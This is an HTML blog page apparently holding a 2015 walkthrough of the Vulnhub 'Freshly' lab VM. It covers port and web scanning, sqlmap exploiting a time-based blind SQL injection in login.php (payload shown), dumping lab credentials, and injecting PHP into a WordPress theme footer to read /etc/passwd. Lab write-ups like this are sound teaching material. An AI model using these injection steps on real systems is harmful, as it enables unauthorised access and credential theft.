@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Vulnhub - Freshly | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2015/04/vulnhub-freshly.html" title="Read more" class="entry-title-link">
+                Vulnhub - Freshly</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2015-04-20T00:00:00+02:00">20 Apr 2015</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/challenge.html" title="Read more with the label challenge" class="meta-link">challenge</a> 
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/vulnhub.html" title="Read more with the label vulnhub" class="meta-link">vulnhub</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 8 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left"
+src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"
+alt="not the droids" width="262"></p>
+<p>I continued to play with the vulnhub virtual machine and started the
+<a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">TopHatSec - Freshly</a>.</p>
+<p>"The goal of this challenge is to break into the machine via the web and find the
+secret hidden in a sensitive file. If you can find the secret, send me an email
+for verification. :)"</p>
+
+
+<h1 id="discovery">Discovery</h1>
+<p>As always we need to know which ports are open.</p>
+<h2 id="nmap">nmap</h2>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 6.47 scan initiated Thu Apr 16 19:13:39 2015 as: nmap -A -A -oA nmap 10.0.2.5</span>
+<span class="code-line">Nmap scan report for 10.0.2.5</span>
+<span class="code-line">Host is up (0.00087s latency).</span>
+<span class="code-line">Not shown: 997 closed ports</span>
+<span class="code-line">PORT     STATE SERVICE  VERSION</span>
+<span class="code-line">80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))</span>
+<span class="code-line">|_http-title: Site doesn&#39;t have a title (text/html).</span>
+<span class="code-line">443/tcp  open  ssl/http Apache httpd</span>
+<span class="code-line">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
+<span class="code-line">|_http-title: Site doesn&#39;t have a title (text/html).</span>
+<span class="code-line">| ssl-cert: Subject: commonName=www.example.com</span>
+<span class="code-line">| Not valid before: 2015-02-17T03:30:05+00:00</span>
+<span class="code-line">|_Not valid after:  2025-02-14T03:30:05+00:00</span>
+<span class="code-line">|_ssl-date: 2047-09-11T02:34:36+00:00; +32y147d13h20m44s from local time.</span>
+<span class="code-line">8080/tcp open  http     Apache httpd</span>
+<span class="code-line">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
+<span class="code-line">|_http-title: Site doesn&#39;t have a title (text/html).</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Thu Apr 16 19:13:52 2015 -- 1 IP address (1 host up) scanned in 12.77 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>There is three ports with a web server running:</p>
+<ul>
+<li>The 80 just display an gif.</li>
+<li>The 443 seems to be like the 8080 with SSL.</li>
+<li>The 8080 is a wordpress website which seems to sell candy (who doesn't love
+      candy?).</li>
+</ul>
+<p><img alt="not the droids" src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"></p>
+<p><em>I try to see if there was any differences between this gif and the original
+one, but nothing.</em></p>
+<h2 id="nikto">Nikto</h2>
+<p>I like to use <a href="https://cirt.net/Nikto2">Nikto</a> when discovering website, I will put only the
+interesting stuff, but I ran <a href="https://cirt.net/Nikto2">Nikto</a> on the 3 ports.</p>
+<p>Port 80:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine Freshly]$ nikto -host 10.0.2.5</span>
+<span class="code-line">Server: Apache/2.4.7 (Ubuntu)</span>
+<span class="code-line">+ /login.php: Admin login page/section found.</span>
+<span class="code-line">+ /phpmyadmin/: phpMyAdmin directory found</span>
+<span class="code-line"></code></pre></div>
+
+<p><img alt="login.php" src="/media/2015.04/login.php.png"></p>
+<p>Port 8080:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine Freshly]$ nikto -host 10.0.2.5 -port 8080</span>
+<span class="code-line">+ OSVDB-3268: /img/: Directory indexing found.</span>
+<span class="code-line">+ /wordpress/: A Wordpress installation was found</span>
+<span class="code-line"></code></pre></div>
+
+<p>We got two login interfaces and a directory listing with images. Let's take a
+look at the wordpress installation.</p>
+<p><img alt="wordpress, index" src="/media/2015.04/wordpress_index.png"></p>
+<p><em>The directory listening was not of any use. As well the phpmyadmin interface
+was not usefull.</em></p>
+<h2 id="wpscan">WPScan</h2>
+<p>We run <a href="https://github.com/wpscanteam/wpscan"><code>wpscan</code></a> on the 8080 website:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine wpscan]$ ruby wpscan.rb --url http://10.0.2.5:8080/wordpress/</span>
+<span class="code-line">[+] URL: http://10.0.2.5:8080/wordpress/</span>
+<span class="code-line">[+] Started: Thu Apr 16 20:01:39 2015</span>
+<span class="code-line"></span>
+<span class="code-line">[!] The WordPress &#39;http://10.0.2.5:8080/wordpress/readme.html&#39; file exists exposing a version number</span>
+<span class="code-line">[!] Full Path Disclosure (FPD) in: &#39;http://10.0.2.5:8080/wordpress/wp-includes/rss-functions.php&#39;</span>
+<span class="code-line">[+] Interesting header: SERVER: Apache</span>
+<span class="code-line">[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN</span>
+<span class="code-line">[+] XML-RPC Interface available under: http://10.0.2.5:8080/wordpress/xmlrpc.php</span>
+<span class="code-line"></span>
+<span class="code-line">[+] WordPress version 4.1.1 identified from meta generator</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Enumerating plugins from passive detection ...</span>
+<span class="code-line"> | 4 plugins found:</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Name: cart66-lite - v1.5.3</span>
+<span class="code-line"> |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/</span>
+<span class="code-line"> |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt</span>
+<span class="code-line"></span>
+<span class="code-line">[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection</span>
+<span class="code-line">    Reference: https://wpvulndb.com/vulnerabilities/7737</span>
+<span class="code-line">    Reference: https://research.g0blin.co.uk/g0blin-00022/</span>
+<span class="code-line">    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442</span>
+<span class="code-line">[i] Fixed in: 1.5.4</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Name: contact-form-7 - v4.1</span>
+<span class="code-line"> |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/</span>
+<span class="code-line"> |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Name: proplayer - v4.7.9.1</span>
+<span class="code-line"> |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/</span>
+<span class="code-line"> |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/readme.txt</span>
+<span class="code-line"></span>
+<span class="code-line">[!] Title: ProPlayer 4.7.9.1 - SQL Injection</span>
+<span class="code-line">    Reference: https://wpvulndb.com/vulnerabilities/6912</span>
+<span class="code-line">    Reference: http://osvdb.org/93564</span>
+<span class="code-line">    Reference: http://www.exploit-db.com/exploits/25605/</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Name: all-in-one-seo-pack - v2.2.5.1</span>
+<span class="code-line"> |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/</span>
+<span class="code-line"> |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt</span>
+<span class="code-line"></span>
+<span class="code-line">[!] Title: All in One SEO Pack &lt;= 2.2.5.1 - Authentication Bypass</span>
+<span class="code-line">    Reference: https://wpvulndb.com/vulnerabilities/7881</span>
+<span class="code-line">    Reference: http://jvn.jp/en/jp/JVN75615300/index.html</span>
+<span class="code-line">    Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/</span>
+<span class="code-line">    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0902</span>
+<span class="code-line">[i] Fixed in: 2.2.6</span>
+<span class="code-line"></code></pre></div>
+
+<p>We got some nice results, three plug-in have security issues. Digging furtherer,
+we notice that:</p>
+<ul>
+<li>All in One SEO Pack  - Authentication Bypas: There was nothing in the metadata.</li>
+<li>Cart66 Lite 1.5.3 - SQL Injection: Need to be authenticated</li>
+<li>proplayer 4.7.9.1 - SQL Injection: Concerns a non available URL (you can run sqlmap on it to confirm this)</li>
+</ul>
+<p>Therefore none of this will help us in this challenge.</p>
+<h1 id="exploit">Exploit</h1>
+<p>Nikto shows us some interesting URL. The login interface at <code>login.php</code> may be
+injectable.</p>
+<h2 id="sqlmap">sqlmap</h2>
+<p>We need to use burp in order to save the POST request to a file, an then we
+launch <a href="http://sqlmap,org">sqlmap</a> on the <code>login.php</code> URL:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine sqlmap]$ python2 sqlmap.py -r login_req -p user</span>
+<span class="code-line">         _</span>
+<span class="code-line"> ___ ___| |_____ ___ ___  {1.0-dev-dbfa8f1}</span>
+<span class="code-line">|_ -| . | |     | .&#39;| . |</span>
+<span class="code-line">|___|_  |_|_|_|_|__,|  _|</span>
+<span class="code-line">      |_|           |_|   http://sqlmap.org</span>
+<span class="code-line"></span>
+<span class="code-line">[*] starting at 20:43:22</span>
+<span class="code-line"></span>
+<span class="code-line">[20:43:22] [INFO] parsing HTTP request from &#39;/home/maggick/work/chall/vulnhub/Freshly/login_req&#39;</span>
+<span class="code-line">[20:43:22] [INFO] resuming back-end DBMS &#39;mysql&#39;</span>
+<span class="code-line">[20:43:22] [INFO] testing connection to the target URL</span>
+<span class="code-line">[20:43:22] [INFO] heuristics detected web page charset &#39;ascii&#39;</span>
+<span class="code-line">sqlmap identified the following injection points with a total of 0 HTTP(s)</span>
+<span class="code-line">requests:</span>
+<span class="code-line">---</span>
+<span class="code-line">Parameter: user (POST)</span>
+<span class="code-line">    Type: AND/OR time-based blind</span>
+<span class="code-line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span>
+<span class="code-line">    Payload: user=asdf&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))RaKL) AND &#39;KuPd&#39;=&#39;KuPd&amp;password=asdf&amp;s=Submit</span>
+<span class="code-line">---</span>
+<span class="code-line">[20:43:22] [INFO] the back-end DBMS is MySQL</span>
+<span class="code-line">web server operating system: Linux Ubuntu</span>
+<span class="code-line">web application technology: Apache 2.4.7, PHP 5.5.9</span>
+<span class="code-line">back-end DBMS: MySQL 5.0.12</span>
+<span class="code-line">[20:43:22] [INFO] fetched data logged to text files under &#39;/home/maggick/.sqlmap/output/10.0.2.5&#39;</span>
+<span class="code-line"></span>
+<span class="code-line">[*] shutting down at 20:43:22</span>
+<span class="code-line"></code></pre></div>
+
+<p>Okay the <code>user</code> parameter is vulnerable to a time-based blind injection. Let's
+see what are the databases:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine sqlmap]$ python2 sqlmap.py -r ~/work/chall/vulnhub/Freshly/longin_req -p user --dbs</span>
+<span class="code-line">back-end DBMS: MySQL 5.0.12</span>
+<span class="code-line">[...]</span>
+<span class="code-line">available databases [7]:</span>
+<span class="code-line">[*] information_schema</span>
+<span class="code-line">[*] login</span>
+<span class="code-line">[*] mysql</span>
+<span class="code-line">[*] performance_schema</span>
+<span class="code-line">[*] phpmyadmin</span>
+<span class="code-line">[*] users</span>
+<span class="code-line">[*] wordpress8080</span>
+<span class="code-line"></code></pre></div>
+
+<p>Let's dump the interesting databases, <code>users</code> and <code>login</code>:</p>
+<p>users:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>Database: login</span>
+<span class="code-line">Table: users</span>
+<span class="code-line">[2 entries]</span>
+<span class="code-line">+----------+-----------+</span>
+<span class="code-line">| password | user_name |</span>
+<span class="code-line">+----------+-----------+</span>
+<span class="code-line">| password | candyshop |</span>
+<span class="code-line">| PopRocks | Sir       |</span>
+<span class="code-line">+----------+-----------+</span>
+<span class="code-line"></code></pre></div>
+
+<p>login:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>Database: wordpress8080</span>
+<span class="code-line">Table: users</span>
+<span class="code-line">[1 entry]</span>
+<span class="code-line">+----------+---------------------+</span>
+<span class="code-line">| username | password            |</span>
+<span class="code-line">+----------+---------------------+</span>
+<span class="code-line">| admin    | SuperSecretPassword |</span>
+<span class="code-line">+----------+---------------------+</span>
+<span class="code-line"></code></pre></div>
+
+<p>So we got some passwords. Then let's use the wordpress password.</p>
+<h2 id="admin-php-and-flag">Admin, PHP and Flag</h2>
+<p>We got the admin password for <code>http://10.0.2.5:8080/wordpress/wp-login</code>.</p>
+<p><img alt="wordpress, admin interface" src="/media/2015.04/wordpress_admin.png"></p>
+<p>As we want to read a file on the system, let's put some PHP code in the theme:
+We go to Appearance -&gt; Editor -&gt; Footer (footer.php) and add some PHP code in
+order to execute it, let's get the <code>/etc/passwd</code> file :</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="x"> </span><span class="cp">&lt;?php</span></span>
+<span class="code-line"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Unable to open file!&quot;</span><span class="p">);</span></span>
+<span class="code-line"><span class="k">echo</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nb">filesize</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">));</span></span>
+<span class="code-line"><span class="nb">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span></span>
+<span class="code-line"><span class="cp">?&gt;</span><span class="x"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>When we reload the index page we got the <code>/etc/password</code> file in the footer:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root:x:0:0:root:/root:/bin/bash</span>
+<span class="code-line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="code-line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="code-line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span class="code-line">sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="code-line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span class="code-line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span class="code-line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span class="code-line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span class="code-line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span class="code-line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span class="code-line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span class="code-line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="code-line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span class="code-line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span class="code-line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
+<span class="code-line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
+<span class="code-line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span class="code-line">libuuid:x:100:101::/var/lib/libuuid:</span>
+<span class="code-line">syslog:x:101:104::/home/syslog:/bin/false</span>
+<span class="code-line">messagebus:x:102:105::/var/run/dbus:/bin/false</span>
+<span class="code-line">user:x:1000:1000:user,,,:/home/user:/bin/bash</span>
+<span class="code-line">mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false</span>
+<span class="code-line">candycane:x:1001:1001::/home/candycane:</span>
+<span class="code-line"># YOU STOLE MY SECRET FILE!</span>
+<span class="code-line"># SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
+<span class="code-line"></code></pre></div>
+
+<p>Wut? We already got the flag!
+No need to root the system… sadly.</p>
+<p>As there is not ssh port open, I tried to log on the VM with
+<code>root:SuperSecretPassword</code> and it simply worked.</p>
+<h1 id="summary">Summary</h1>
+<p>This was a simple challenge, based on web pentesting.
+It was a bit short but nonetheless interesting.</p>
+<p>Road to flag:</p>
+<ul>
+<li>SQL injection on the <code>/login.php</code> interface</li>
+<li>Get the wordpress admin password</li>
+<li>As wordpress admin inject PHP code in the web site (via the theme)</li>
+<li>Display <code>/etc/passwd</code></li>
+</ul>
+<p>Flag : <strong>"NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"</strong></p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2015/04/ctf-ndh-qualifications.html"> CTF NDH Qualifications </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2015/05/blog-changes-2.html"> Blog changes #2 </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
